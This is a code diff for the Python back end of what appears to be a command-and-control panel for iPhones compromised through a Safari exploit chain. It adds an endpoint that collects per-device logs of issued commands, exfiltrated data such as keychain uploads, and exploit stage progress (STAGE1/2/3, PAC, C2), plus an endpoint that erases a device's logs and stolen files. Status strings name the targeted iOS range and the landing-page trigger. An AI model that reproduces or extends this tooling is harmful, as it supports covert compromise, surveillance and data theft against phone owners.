@@ -8,8 +8,8 @@ import uuid as _uuid
 from datetime import datetime, timedelta
 
 from ..database import (
-    get_db, Device, DeviceGroup, Log, ExfilData, Command, create_audit_log, TrafficChannel, LandingTemplate,
-    compute_os_type, compute_compatible_level,
+    get_db, Device, DeviceGroup, Log, ExfilData, Command, DeviceExploitLog, create_audit_log, TrafficChannel, LandingTemplate,
+    compute_os_type, compute_compatible_level, normalize_device_uuid, resolve_forwarded_uuid_ua,
 )
 from ..auth import get_current_user
 from .notifications import broadcast_notification_sync
@@ -504,8 +504,15 @@ def _is_ios_compatible(os_version: Optional[str], browser_name: Optional[str] = 
 @router.post("/register")
 async def register_device(request: Request, payload: DeviceRegisterRequest, db: Session = Depends(get_db)):
     client_ip = request.client.host if request.client else None
-    ua = payload.user_agent or (request.headers.get("user-agent") or "")
-    uuid = payload.device_uuid or None
+    header_ua = request.headers.get("user-agent") or ""
+    raw_uuid = payload.device_uuid or None
+    # exploit_server 转发 register 时 HTTP UA=Exploit-Server/1.0，需信任已存在设备的 UUID，
+    # 避免 ios-→dev- 幽灵记录；仅对全新 UUID 做前缀校正（PC 缓存旧 ios-/unknown- 兜底）。
+    if raw_uuid:
+        uuid, ua = resolve_forwarded_uuid_ua(db, raw_uuid, payload.user_agent, header_ua)
+    else:
+        ua = payload.user_agent or header_ua
+        uuid = None
     if not uuid:
         if ua and any(k in ua for k in ("iPhone", "iPad", "iPod", "iOS")):
             uuid = "ios-" + _uuid.uuid4().hex[:16]
@@ -947,6 +954,639 @@ async def get_device_heartbeats(
     total = len(dedup)
     items = dedup[skip:skip + limit]
     return {"total": total, "items": items}
+
+
+def _safe_str(v, max_len=300):
+    try:
+        if v is None:
+            return ""
+        s = str(v)
+        if len(s) > max_len:
+            s = s[:max_len] + f" ...(+{len(s) - max_len})"
+        return s
+    except Exception:
+        return ""
+
+
+def _evt(ts, kind, source, title, detail="", tags=None, ip=None, level="info", code=None, extra=None):
+    if ts is None:
+        return None
+    if not isinstance(ts, datetime):
+        try:
+            ts = datetime.fromisoformat(str(ts).replace("Z", ""))
+        except Exception:
+            return None
+    obj = {
+        "time": ts.isoformat(),
+        "type": kind or "misc",
+        "source": source or "",
+        "title": title or "",
+        "detail": detail or "",
+        "tags": list(tags or []),
+        "level": level or "info",
+    }
+    if ip is not None:
+        obj["ip"] = ip
+    if code is not None:
+        obj["status_code"] = int(code)
+    if isinstance(extra, dict):
+        try:
+            for k, v in extra.items():
+                if v is None:
+                    continue
+                if k in ("time", "type", "source", "title", "detail", "tags", "level", "ip", "status_code"):
+                    continue
+                obj[k] = v
+        except Exception:
+            pass
+    return obj
+
+
+@router.get("/{device_uuid}/logs")
+async def get_device_logs(
+    device_uuid: str, limit: int = 200, skip: int = 0, tail_log: int = 0,
+    db: Session = Depends(get_db), current_user=Depends(get_current_user)
+):
+    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
+    if not device:
+        raise HTTPException(status_code=404, detail="Device not found")
+    assert_owns_device(db, current_user, device)
+    base_ip = (device.ip or "").strip() or None
+    events = []
+    _dbg = {
+        "http_row_count": None, "http_event_count": 0, "http_err": None,
+        "cmd_row_count": None, "cmd_event_count": 0, "cmd_err": None,
+        "exfil_row_count": None, "exfil_event_count": 0, "exfil_err": None,
+        "lifecycle_event_count": 0, "lifecycle_err": None,
+        "exploit_event_count": 0, "exploit_err": None,
+        "xlog_row_count": None, "xlog_event_count": 0, "xlog_err": None,
+        "tail_log": 0, "tail_log_file": None, "tail_log_lines": 0,
+        "tail_log_err": None,
+        "db": None,
+    }
+
+    # 1) HTTP request logs (Log table)
+    try:
+        log_rows = (
+            db.query(Log)
+            .filter(Log.device_uuid == device_uuid)
+            .order_by(desc(Log.timestamp))
+            .limit(min(limit + 200, 800))
+            .all()
+        )
+        _dbg["http_row_count"] = len(log_rows)
+        _before = len(events)
+        for l in log_rows:
+            method = _safe_str(getattr(l, "method", None), 12) or "-"
+            path = _safe_str(getattr(l, "path", None), 200) or "-"
+            code = getattr(l, "status_code", None)
+            lvl = "info"
+            if code is not None:
+                try:
+                    c = int(code)
+                    if c >= 500:
+                        lvl = "error"
+                    elif c >= 400:
+                        lvl = "warn"
+                except Exception:
+                    pass
+            log_type = _safe_str(getattr(l, "log_type", None), 20)
+            ua = _safe_str(getattr(l, "user_agent", None), 120)
+            title = f"{method} {path}"
+            detail_parts = []
+            if log_type:
+                detail_parts.append(f"log_type={log_type}")
+            if ua:
+                detail_parts.append(f"ua={ua}")
+            if code is not None:
+                detail_parts.append(f"status={code}")
+            clen = getattr(l, "content_length", None)
+            if clen:
+                detail_parts.append(f"bytes={clen}")
+            evt = _evt(
+                getattr(l, "timestamp", None),
+                "http", log_type or "request",
+                title, " | ".join(detail_parts),
+                tags=[method] + ([log_type] if log_type else []),
+                ip=getattr(l, "ip", None) or base_ip,
+                level=lvl, code=code,
+                extra={"method": method, "path": path, "ua": ua, "log_type": log_type,
+                       "content_length": clen, "log_id": getattr(l, "id", None)},
+            )
+            if evt:
+                events.append(evt)
+        _dbg["http_event_count"] = len(events) - _before
+    except Exception as _e:
+        _dbg["http_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
+        try:
+            import traceback as _tb
+            _dbg["http_tb"] = _tb.format_exc()[:2000]
+        except Exception:
+            pass
+    finally:
+        try: _dbg["db"] = str(db.bind.url) if getattr(db, "bind", None) else None
+        except Exception: _dbg["db"] = "?"
+
+    # 2) Commands (Command table)
+    try:
+        cmd_rows = (
+            db.query(Command)
+            .filter(Command.device_uuid == device_uuid)
+            .order_by(desc(Command.executed_at if Command.executed_at is not None else Command.created_at))
+            .limit(min(limit + 100, 500))
+            .all()
+        )
+        _dbg["cmd_row_count"] = len(cmd_rows)
+        _before = len(events)
+        for c in cmd_rows:
+            cmd_text = _safe_str(c.command, 200) or "(empty)"
+            status = _safe_str(getattr(c, "status", None), 20) or "unknown"
+            st_low = status.lower()
+            lvl = "info"
+            if st_low in ("failed", "error", "timeout"):
+                lvl = "error"
+            elif st_low in ("pending", "deferred", "stale"):
+                lvl = "warn"
+            elif st_low in ("completed", "success", "ok"):
+                lvl = "success"
+            elif st_low == "executing":
+                lvl = "debug"
+            ts = getattr(c, "executed_at", None) or getattr(c, "created_at", None)
+            out_snip = ""
+            out_raw = getattr(c, "output", None)
+            if out_raw:
+                out_snip = _safe_str(out_raw, 500)
+            cmd_id = getattr(c, "id", None)
+            title = f"[CMD {status.upper()}] {cmd_text}"
+            detail_parts = []
+            if ts == getattr(c, "executed_at", None):
+                created_at = getattr(c, "created_at", None)
+                if isinstance(created_at, datetime):
+                    detail_parts.append(f"created_at={created_at.isoformat()}")
+            if out_snip:
+                detail_parts.append(f"output={out_snip}")
+            evt = _evt(
+                ts, "command", f"command:{status}",
+                title, " | ".join(detail_parts),
+                tags=[f"cmd:{status}", "command"],
+                ip=base_ip, level=lvl,
+                extra={"command": cmd_text, "status": status, "cmd_id": cmd_id,
+                       "created_at": _safe_str(getattr(c, "created_at", None), 40),
+                       "executed_at": _safe_str(getattr(c, "executed_at", None), 40),
+                       "output_preview": out_snip},
+            )
+            if evt:
+                events.append(evt)
+        _dbg["cmd_event_count"] = len(events) - _before
+    except Exception as _e:
+        _dbg["cmd_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
+        try:
+            import traceback as _tb
+            _dbg["cmd_tb"] = _tb.format_exc()[:2000]
+        except Exception:
+            pass
+
+    # 3) ExfilData uploads
+    try:
+        exfil_rows = (
+            db.query(ExfilData)
+            .filter(ExfilData.device_uuid == device_uuid)
+            .order_by(desc(ExfilData.uploaded_at))
+            .limit(min(limit + 100, 500))
+            .all()
+        )
+        _dbg["exfil_row_count"] = len(exfil_rows)
+        _before = len(events)
+        for e in exfil_rows:
+            cat = _safe_str(getattr(e, "category", None), 30) or "exfil"
+            description_text = _safe_str(getattr(e, "description", None), 200)
+            fp = _safe_str(getattr(e, "file_path", None) or getattr(e, "path", None), 300)
+            fs = getattr(e, "file_size", None)
+            ts = getattr(e, "uploaded_at", None) or getattr(e, "created_at", None)
+            fsize_h = ""
+            if isinstance(fs, int):
+                if fs < 1024:
+                    fsize_h = f"{fs} B"
+                elif fs < 1024 * 1024:
+                    fsize_h = f"{fs/1024:.1f} KB"
+                else:
+                    fsize_h = f"{fs/1024/1024:.2f} MB"
+            title = f"[EXFIL {cat.upper()}] {description_text or fp or '(no description)'}"
+            detail_parts = []
+            if cat:
+                detail_parts.append(f"category={cat}")
+            if fsize_h:
+                detail_parts.append(f"size={fsize_h}")
+            if fp:
+                detail_parts.append(f"file={fp}")
+            evt = _evt(
+                ts, "exfil", f"exfil:{cat}",
+                title, " | ".join(detail_parts),
+                tags=[f"exfil:{cat}", "upload", "exfil"],
+                ip=base_ip, level="success",
+                extra={"category": cat, "description": description_text, "file_path": fp,
+                       "file_size": fs, "file_size_h": fsize_h,
+                       "exfil_id": getattr(e, "id", None)},
+            )
+            if evt:
+                events.append(evt)
+        _dbg["exfil_event_count"] = len(events) - _before
+    except Exception as _e:
+        _dbg["exfil_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
+        try:
+            import traceback as _tb
+            _dbg["exfil_tb"] = _tb.format_exc()[:2000]
+        except Exception:
+            pass
+
+    # 4) Lifecycle heartbeats (first_seen / last_seen + exploit_status)
+    try:
+        _before = len(events)
+        fs = getattr(device, "first_seen", None)
+        if isinstance(fs, datetime):
+            ev_first = _evt(
+                fs, "device", "first_seen", "设备首次上线 / 注册",
+                f"ip={base_ip or '-'} | exploit_status={_safe_str(getattr(device, 'exploit_status', None), 20) or 'pending'}",
+                tags=["lifecycle", "first_seen", "register"],
+                ip=base_ip, level="success",
+                extra={"ua": _safe_str(getattr(device, "user_agent", None), 200),
+                       "os": _safe_str(getattr(device, "os_version", None), 20),
+                       "exploit_status": _safe_str(getattr(device, "exploit_status", None), 30)},
+            )
+            if ev_first:
+                events.append(ev_first)
+        ls = getattr(device, "last_seen", None)
+        if isinstance(ls, datetime):
+            cutoff = datetime.now() - timedelta(minutes=5)
+            is_on = ls >= cutoff
+            ev_last = _evt(
+                ls, "device", "last_seen", f"最近心跳（{'在线' if is_on else '离线'}）",
+                f"ip={base_ip or '-'} | enabled={'YES' if (getattr(device, 'enabled', 1) or 1) else 'NO'}",
+                tags=["lifecycle", "last_seen", "heartbeat"],
+                ip=base_ip, level="info" if not is_on else "success",
+                extra={"is_online": bool(is_on),
+                       "enabled": bool(getattr(device, "enabled", 1) or 1)},
+            )
+            if ev_last:
+                events.append(ev_last)
+        _dbg["lifecycle_event_count"] = len(events) - _before
+    except Exception as _e:
+        _dbg["lifecycle_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
+        try:
+            import traceback as _tb
+            _dbg["lifecycle_tb"] = _tb.format_exc()[:2000]
+        except Exception:
+            pass
+
+    # 5) Exploit stage changes: infer from commands / exfil:sandbox vs exfil:keychain
+    try:
+        es = _safe_str(getattr(device, "exploit_status", None), 30).lower()
+        if es in ("success", "exploited", "complete", "ok"):
+            # Find first non-sandbox exfil or earliest completed ds_info
+            stage_ts = None
+            try:
+                non_sand = (
+                    db.query(ExfilData)
+                    .filter(ExfilData.device_uuid == device_uuid)
+                    .filter(ExfilData.category.notin_(["sandbox"]))
+                    .order_by(asc(ExfilData.uploaded_at))
+                    .limit(1)
+                    .first()
+                )
+                if non_sand:
+                    stage_ts = getattr(non_sand, "uploaded_at", None)
+            except Exception:
+                non_sand = None
+            if stage_ts is None:
+                try:
+                    info_cmd = (
+                        db.query(Command)
+                        .filter(Command.device_uuid == device_uuid)
+                        .filter(Command.command.like("%ds_info%"))
+                        .filter(Command.status.in_(["completed", "success", "ok"]))
+                        .order_by(asc(Command.executed_at if Command.executed_at is not None else Command.created_at))
+                        .limit(1)
+                        .first()
+                    )
+                    if info_cmd:
+                        stage_ts = getattr(info_cmd, "executed_at", None) or getattr(info_cmd, "created_at", None)
+                except Exception:
+                    info_cmd = None
+            if stage_ts is None:
+                stage_ts = ls
+            ev_exp = _evt(
+                stage_ts, "exploit", f"exploit:{es or 'success'}",
+                f"漏洞利用完成（exploit_status={es or 'success'}），已进入命令执行阶段",
+                "iOS Safari exploit chain 执行成功，可下发 ds_* 控制命令",
+                tags=["exploit", "exploited", "success"],
+                ip=base_ip, level="success",
+                extra={"exploit_status": es or "success"},
+            )
+            if ev_exp:
+                events.append(ev_exp)
+        elif es in ("pending", "in_progress", "running"):
+            ev_pend = _evt(
+                ls, "exploit", f"exploit:{es or 'pending'}",
+                f"漏洞利用中（exploit_status={es or 'pending'}）",
+                "等待 iPhone Safari 点击落地页按钮触发完整 exploit chain，完成后 exploit_status 将变为 success",
+                tags=["exploit", "pending", "warn"],
+                ip=base_ip, level="warn",
+                extra={"exploit_status": es or "pending",
+                       "hint": "请用 Safari 打开 /ch/<slug>?tpl=<tpl> 并点击按钮，观察 Stage1/2/3 是否 200"},
+            )
+            if ev_pend:
+                events.append(ev_pend)
+        elif es in ("failed", "error"):
+            ev_fail = _evt(
+                ls, "exploit", f"exploit:{es or 'failed'}",
+                f"漏洞利用失败（exploit_status={es or 'failed'}）",
+                "请检查 iOS 版本是否在支持区间（13.0~17.2）、Stage payload 文件是否存在、是否使用 Safari 浏览器",
+                tags=["exploit", "failed"],
+                ip=base_ip, level="error",
+                extra={"exploit_status": es or "failed"},
+            )
+            if ev_fail:
+                events.append(ev_fail)
+    except Exception:
+        pass
+
+    # 6) Exploit console logs (DeviceExploitLog 表 - 浏览器端 group.html 上报的 STAGE1/STAGE2/PAC/... 细粒度日志)
+    try:
+        import json as _json
+        ex_rows = (
+            db.query(DeviceExploitLog)
+            .filter(DeviceExploitLog.device_uuid == device_uuid)
+            .order_by(desc(DeviceExploitLog.timestamp))
+            .limit(min(limit + 300, 1000))
+            .all()
+        )
+        for x in ex_rows:
+            lvl_raw = _safe_str(getattr(x, "level", None), 12).lower() or "log"
+            msg = _safe_str(getattr(x, "message", None), 4000)
+            if not msg:
+                continue
+            phase = _safe_str(getattr(x, "phase", None), 30)
+            ts = getattr(x, "timestamp", None)
+            title = ""
+            if phase:
+                title = f"[{phase.upper()}] {msg[:120]}"
+            else:
+                head = msg[:120]
+                # 自动识别前缀 STAGE1/STAGE2/STAGE3/PAC/LOADER/C2 -> 作为 phase 标签
+                m_ph = re.match(r"^\s*\[?\s*(STAGE[123]|LOADER|PAC|C2|EXPLOIT|PAYLOAD|FETCH)\s*\]?\s*[:：\- ]?", msg, flags=re.IGNORECASE)
+                if m_ph:
+                    phase = m_ph.group(1).upper()
+                    title = f"[{phase}] {msg[:120]}"
+                else:
+                    title = head
+            # 标签
+            tags = [f"exploit_console"]
+            if phase:
+                tags.append(f"phase:{phase.lower()}")
+            # level 映射到事件 level
+            lvl = "debug"
+            if lvl_raw in ("error", "fatal"):
+                lvl = "error"
+            elif lvl_raw == "warn":
+                lvl = "warn"
+            elif lvl_raw == "info":
+                lvl = "info"
+            elif lvl_raw == "success" or ("success" in msg.lower() and "fail" not in msg.lower()):
+                lvl = "success"
+            extra = {"phase": phase, "level_raw": lvl_raw, "log_id": getattr(x, "id", None)}
+            try:
+                tj = getattr(x, "tags_json", None)
+                if tj:
+                    extra["tags_raw"] = _json.loads(tj)
+            except Exception:
+                pass
+            try:
+                ej = getattr(x, "extra_json", None)
+                if ej:
+                    extra["extra"] = _json.loads(ej)
+            except Exception:
+                pass
+            src_ip = getattr(x, "source_ip", None) or base_ip
+            evt = _evt(
+                ts, "exploit_console", phase or "exploit_log",
+                title, msg, tags=tags, ip=src_ip, level=lvl,
+                extra=extra,
+            )
+            if evt:
+                events.append(evt)
+    except Exception:
+        pass
+
+    # 7) Tail device-specific log file (logs/devices/YYYYMMDD/{uuid}.log 末尾 N 行 — 用户建议按日期+UUID 生成文件)
+    if tail_log:
+        try:
+            from pathlib import Path as _P
+            import re as _re
+            _dbg["tail_log"] = 1
+            # 读取的行数：优先 tail_log 传入的数值，> 10 就按传入，否则默认 100
+            n_lines = int(tail_log) if isinstance(tail_log, int) and tail_log > 10 else 100
+            safe_uuid = "".join(ch for ch in str(device_uuid).strip() if ch.isalnum() or ch in ("-", "_"))[:64]
+            # 先尝试当日目录，没有再回溯最近 3 天
+            now = datetime.now()
+            tried_paths = []
+            chosen_path = None
+            for day_offset in range(4):
+                day = now - timedelta(days=day_offset)
+                date_str = day.strftime("%Y%m%d")
+                # 优先从 exploit_server 的目录结构找：server/logs/devices/YYYYMMDD/{uuid}.log
+                candidate = _P(__file__).resolve().parent.parent.parent / "logs" / "devices" / date_str / f"{safe_uuid}.log"
+                tried_paths.append(str(candidate))
+                if candidate.exists():
+                    chosen_path = candidate
+                    break
+                # 兼容：直接相对路径 server/logs/devices/
+                candidate2 = _P("server/logs/devices") / date_str / f"{safe_uuid}.log"
+                tried_paths.append(str(candidate2))
+                if candidate2.exists():
+                    chosen_path = candidate2
+                    break
+                # 兼容：logs/devices/
+                candidate3 = _P("logs/devices") / date_str / f"{safe_uuid}.log"
+                tried_paths.append(str(candidate3))
+                if candidate3.exists():
+                    chosen_path = candidate3
+                    break
+            _dbg["tail_log_file"] = str(chosen_path) if chosen_path else None
+            _dbg["tail_log_tried"] = tried_paths
+            if chosen_path and chosen_path.is_file():
+                try:
+                    with open(chosen_path, "r", encoding="utf-8", errors="replace") as _lf:
+                        all_lines = _lf.readlines()
+                    tail_lines = all_lines[-n_lines:] if len(all_lines) > n_lines else all_lines
+                    _dbg["tail_log_lines"] = len(tail_lines)
+                    _ts_re = _re.compile(r"^\s*\[(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})\]\s*(.*)$")
+                    _lvl_re = _re.compile(r"\[(ERROR|WARN|WARNING|INFO|DEBUG|FATAL|SUCCESS|ERR)\]", _re.IGNORECASE)
+                    _before = len(events)
+                    for raw_line in tail_lines:
+                        line = raw_line.rstrip("\n").rstrip("\r")
+                        if not line.strip():
+                            continue
+                        ts_match = _ts_re.match(line)
+                        ts_dt = None
+                        body = line
+                        if ts_match:
+                            ts_str = ts_match.group(1)
+                            body = ts_match.group(2).strip()
+                            try:
+                                ts_dt = datetime.strptime(ts_str, "%Y-%m-%d %H:%M:%S")
+                            except Exception:
+                                ts_dt = None
+                        # 检测 level
+                        lvl = "info"
+                        lvl_m = _lvl_re.search(body)
+                        if lvl_m:
+                            lvl_raw = lvl_m.group(1).upper()
+                            if lvl_raw in ("ERROR", "FATAL", "ERR"):
+                                lvl = "error"
+                            elif lvl_raw in ("WARN", "WARNING"):
+                                lvl = "warn"
+                            elif lvl_raw == "SUCCESS":
+                                lvl = "success"
+                            elif lvl_raw == "DEBUG":
+                                lvl = "debug"
+                        else:
+                            bl = body.lower()
+                            if any(k in bl for k in ("error", "exception", "failed", "fail", "fatal", "err ")):
+                                lvl = "error"
+                            elif any(k in bl for k in ("warn", "stale", "defer", "concurrency", "reset")):
+                                lvl = "warn"
+                            elif any(k in bl for k in ("success", "ok ", "complete", "pickup", "exploited", "registered", "register")):
+                                lvl = "success"
+                        # phase 识别
+                        phase = None
+                        _ph_m = _re.match(r"^\s*\[?\s*(CMD-[A-Z_]+|STAGE[123]|LOADER|PAC|C2|EXPLOIT|UPLOAD|REPORT|NATIVE|SAFARI|HARVEST|EXFIL)\s*\]?\s*[:：\- ]?", body, flags=_re.IGNORECASE)
+                        if _ph_m:
+                            phase = _ph_m.group(1).upper()
+                        # 标题
+                        title = body[:160] if len(body) <= 160 else body[:160] + "..."
+                        detail = body
+                        tags = ["raw_log"]
+                        if phase:
+                            tags.append(phase.lower().replace(" ", "_"))
+                        evt = _evt(
+                            ts_dt, "raw_log", phase or "server_log",
+                            title, detail, tags=tags, ip=base_ip, level=lvl,
+                            extra={"source": "file", "file": str(chosen_path), "phase": phase},
+                        )
+                        if evt:
+                            events.append(evt)
+                    _dbg["tail_log_event_count"] = len(events) - _before
+                except Exception as _fe:
+                    _dbg["tail_log_err"] = f"read_file: {type(_fe).__name__}: {str(_fe)[:300]}"
+                    try:
+                        import traceback as _tb
+                        _dbg["tail_log_tb"] = _tb.format_exc()[:1500]
+                    except Exception:
+                        pass
+        except Exception as _e:
+            _dbg["tail_log_err"] = f"{type(_e).__name__}: {str(_e)[:300]}"
+            try:
+                import traceback as _tb
+                _dbg["tail_log_tb"] = _tb.format_exc()[:1500]
+            except Exception:
+                pass
+
+    # Sort + dedup + paginate
+    def _sort_key(ev):
+        return (ev.get("time") or "", 0)
+    events.sort(key=_sort_key, reverse=True)
+    seen = set()
+    dedup = []
+    for ev in events:
+        key = (ev.get("time") or "", ev.get("type") or "", ev.get("source") or "",
+               (ev.get("title") or "")[:60])
+        if key in seen:
+            continue
+        seen.add(key)
+        dedup.append(ev)
+    total = len(dedup)
+    items = dedup[skip: skip + max(1, min(limit, 500))]
+
+    # Summary counters
+    summary = {"http": 0, "command": 0, "exfil": 0, "device": 0, "exploit": 0, "exploit_console": 0, "raw_log": 0, "errors": 0, "warnings": 0, "success": 0}
+    for ev in dedup:
+        t = ev.get("type") or ""
+        if t in summary:
+            summary[t] += 1
+        lv = (ev.get("level") or "").lower()
+        if lv == "error":
+            summary["errors"] += 1
+        elif lv == "warn":
+            summary["warnings"] += 1
+        elif lv == "success":
+            summary["success"] += 1
+    summary["_dbg"] = _dbg
+    summary["total"] = total
+
+    return {"total": total, "items": items, "events": items, "summary": summary, "device_uuid": device_uuid, "_dbg": _dbg}
+
+
+@router.delete("/{device_uuid}/logs")
+async def clear_device_logs(
+    request: Request, device_uuid: str, otp_code: str = "",
+    db: Session = Depends(get_db), current_user=Depends(get_current_user)
+):
+    require_module_2fa(db, current_user, "devices", otp_code)
+    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
+    if not device:
+        raise HTTPException(status_code=404, detail="Device not found")
+    assert_owns_device(db, current_user, device)
+    deleted = {"logs": 0, "commands": 0, "exfil": 0, "files": 0, "exploit_logs": 0}
+    # 1) Logs (http request table)
+    try:
+        deleted["logs"] = db.query(Log).filter(Log.device_uuid == device_uuid).delete(synchronize_session=False)
+    except Exception:
+        deleted["logs"] = 0
+    # 2) Commands (keep the row if pending in-flight? -> safer to delete all, user asked to clear logs)
+    try:
+        deleted["commands"] = db.query(Command).filter(Command.device_uuid == device_uuid).delete(synchronize_session=False)
+    except Exception:
+        deleted["commands"] = 0
+    # 3) ExfilData rows + actual files on disk
+    try:
+        exfil_rows = db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).all()
+        from pathlib import Path as _P
+        for er in exfil_rows:
+            fp = getattr(er, "file_path", None)
+            if fp:
+                try:
+                    p = _P(str(fp))
+                    if p.exists() and p.is_file():
+                        try:
+                            p.unlink()
+                            deleted["files"] += 1
+                        except Exception:
+                            pass
+                except Exception:
+                    pass
+        deleted["exfil"] = db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).delete(synchronize_session=False)
+    except Exception:
+        deleted["exfil"] = 0
+    # 4) DeviceExploitLog (exploit 过程控制台细粒度日志)
+    try:
+        deleted["exploit_logs"] = (db.query(DeviceExploitLog)
+                                    .filter(DeviceExploitLog.device_uuid == device_uuid)
+                                    .delete(synchronize_session=False))
+    except Exception:
+        deleted["exploit_logs"] = 0
+    db.commit()
+    username = current_user.username if current_user else "anonymous"
+    try:
+        create_audit_log(db, username=username, action="device_logs_clear", resource_type="device",
+                         resource_id=device_uuid,
+                         detail=(f"清空 logs={deleted['logs']}, commands={deleted['commands']}, "
+                                 f"exfil={deleted['exfil']}, files={deleted['files']}, "
+                                 f"exploit_logs={deleted['exploit_logs']}"),
+                         ip_address=request.client.host if request.client else None)
+    except Exception:
+        db.rollback()
+        db.commit()
+    return {"device_uuid": device_uuid, "deleted": deleted}
 
 
 @router.get("/{device_uuid}")
